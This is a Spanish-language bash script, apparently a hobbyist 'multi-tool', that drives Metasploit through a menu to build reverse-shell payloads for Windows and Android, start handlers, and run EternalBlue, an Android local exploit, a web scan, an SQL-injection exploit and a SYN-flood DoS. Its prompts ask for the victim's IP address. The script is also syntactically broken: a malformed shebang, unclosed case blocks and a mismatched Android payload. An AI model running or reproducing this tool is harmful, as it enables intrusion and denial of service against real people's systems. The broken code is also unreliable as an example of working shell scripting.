#3/bin/bash
#proyecto NAVAJA SUIZA
#ilia


echo -e "\e[1;30m Este proyecto es una multi herraminta au nen proceso de varias funciones las cuales podras ver\e[0m"
sleep 5s
echo -e "\e[1;31m Espero poderlos ayudar\e[0m"
sleep 5s



trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO \e[0m"
    sleep 2s
    clear
    exit 0
}
function limpiar {
    clear
}
clear
sleep 2s
while :
do 
opcion=0

echo -e "\e[1;34m   [1]\e[0m \e[1;34mPAYLOAD\e[0m"
echo -e "\e[1;34m   [2]\e[0m \e[1;34mEXPLOIT\e[0m"
echo -e "\e[1;34m   [3]\e[0m \e[1;34mANALIZADOR DE WEB\e[0m"
echo -e "\e[1;34m   [4]\e[0m \e[1;34mINJECCION SQL\e[0m"
echo -e "\e[1;34m   [5]\e[0m \e[1;34mATAQUE DOS\e[0m"
echo -e "\e[1;34m   [6]\e[0m \e[1;34mATAQUE FUERZA BRUTA(EN CREACION)\e[0m"
echo -e "\e[1;34m   [7]\e[0m \e[1;34mSALIR\e[0m"
read opcion
case $opcion in
1)

  sleep 2s
  while :
  do 
  opcion=0

  echo -e "\e[1;33m   [1]\e[0m \e[1;34mWINDOWS PAYLOAD\e[0m"
  echo -e "\e[1;33m   [2]\e[0m \e[1;34mANDROID PAYLOAD\e[0m"
  echo -e "\e[1;33m   [3]\e[0m \e[1;34mSALIR\e[0m"
  read opcion
  case $opcion in 
 1)
  sleep 5s
  echo -n -e "\e[1;33mDIRECCION IP :\e[0m"
  read IP
  sleep 2s
  echo -n -e "\e[1;33mPUERTO DE CONEXION :\e[0m"
  read PUERTO
  sleep 2s
  echo -n -e "\e[1;33mELIJE UN NOMBRE PARA LA APLICACION :\e[0m"
  read NOMBRE
  sleep 2s 

  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PUERTO -f exe -o $NOMBRE.exe

  sleep 2s
  sudo service postgresql start
  sleep 2s 
  clear
  sleep 4s
  msfconsole -x "use multi/handler;\
  set PAYLOAD windows/meterpreter/reverse_tcp;\
  set LHOST $IP;\
  set LPORT $PUERTO;\
  exploit"
  read enterkey
  ;;
 2)
  sleep 5s
  echo -n -e "\e[1;33mDIRECCION IP :\e[0m"
  read IP
  sleep 2s
  echo -n -e "\e[1;33mPUERTO DE CONExION :\e[0m"
  read PUERTO
  sleep 2s
  echo -n -e "\e[1;33mELIJA UN NOMBRE PARA LA APLICACION :\e[0m"
  read NOMBRE
  sleep 2s
  msfvenom -p windows/shell/reverse_tcp LHOST=$IP LPORT=$PUERTO -f apk -o $NOMBRE.apk
  sleep 2s
  sudo service postgresql start
  sleep 2s
  clear
  sleep 4s
  msfconsole -x "use multi/handler;\
  set PAYLOAD windows/shell/reverse_tcp;\
  set LHOST $IP;\
  set LPORT $PUERTO;\
  exploit"
  read enterkey
  ;;
 3)
  clear
  exit 0
  read enterkey
  ;;
 *)
  clear
  echo -e "\e[1;31mNo se que me pides...\e[0m"

  exit 0
  ;;

2)
  sleep 2s
  while :
  do 
  opcion=0

  echo -e "\e[1;33m   [1]\e[0m \e[1;34mWINDOWS EXPLOIT\e[0m"
  echo -e "\e[1;33m   [2]\e[0m \e[1;34mANDROID EXPLOIT\e[0m"
  echo -e "\e[1;33m   [3]\e[0m \e[1;34mSALIR\e[0m"
  read opcion
  case $opcion in
  1)
   sleep 5s 
   echo -n -e "\e[1;33mDIRECCION IP DE LA VICTIMA :\e[0m"
   read IP
   echo -n -e "\e[1;33mPUERTO :\e[0m"
   read PORT
   sleep 2s 
   sudo service postgresql start
   sleep 2s 
   clear
   sleep 4s
   msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;\
                   set RHOSTS $IP;\
                   set RPORT $PORT;\
                   set VERIFY_ARCH;\
                   set VERIFY_TARGET;\
                   exploit"
   read enterkey
   ;;
  2)
   sleep 5s
   echo -n -e "\e[1;33mDIRECCION IP DE LA VICTIMA :\e[0m"
   read IP
   sleep 2s
   echo -n -e "\e[1;33mSESSION :\e[0m"
   read NUMERO
   sleep 2s 
   sudo service postgresql start
   sleep 2s
   clear
   sleep 4s
   msfconsole -x "use exploit/android/local/binder_uaf;\
                   set SESSION $NUMERO;\
                   set LHOST $IP;\
                   run" 
   read enterkey
   ;;
  3)
   clear
   exit 0
   read enterkey
   ;;
 *)
   clear
   echo -e "\e[1;31mNo se que me pides...\e[0m"

   exit 0
   ;;
3)
  sleep 2.5s 
  echo -n -e "\e[1;34mAÑADE EL SITIO WEB DE LA VICTIMA:\e[0m"
  read IP
  sleep 1s 
  echo -n -e "\e[1;34mFIJAMOS EL LA WEB (url de la victima):\e[0m"
  read IP2
  sleep 1s 
  sudo service postgresql start
  sleep 1s 
  clear
  sleep 2s
  msfconsole -x "load wmap;\
                 wmap_sites -a $IP
                 wmap_targets -d $IP2
                 wmap_run -e"

  read enterkey
  ;;
4)
  sleep 2.5s 
  echo -n -e "\e[1;34mDIRECCION IP DE LA WEB DE LA VICTIMA :\e[0m"
  read IP
  sleep 1s 
  sudo service postgresql start
  sleep 1s 
  clear
  sleep 2s
  msfconsole -x "exploit/multi/http/atutor_sqli;\
                  set RHOSTS $IP;\
                  exploit"


  read enterkey
  ;;
5)
  sleep 2.5s 
  echo -n -e "\e[1;34mDIRECCION IP DE LA VICTIMA :\e[0m"
  read IP
  sleep 1s 
  sudo service postgresql start
  sleep 1s 
  clear
  sleep 2s
  msfconsole -x "use /auxiliary/dos/tcp/synflood;\
                  set RHOSTS $IP;\
                  exploit"


  read enterkey
  ;;
6)
 clear
 exit 0
 read Internet
 ;;
7)
 clear
 exit 0
 read enterkey
 ;;
*)

 clear
 echo -e "\e[1;31mNo te entiedno...\e[0m"

 exit 0
;;
esac
echo "Gracias por usar esta herramienta"
sleep 4s
done 
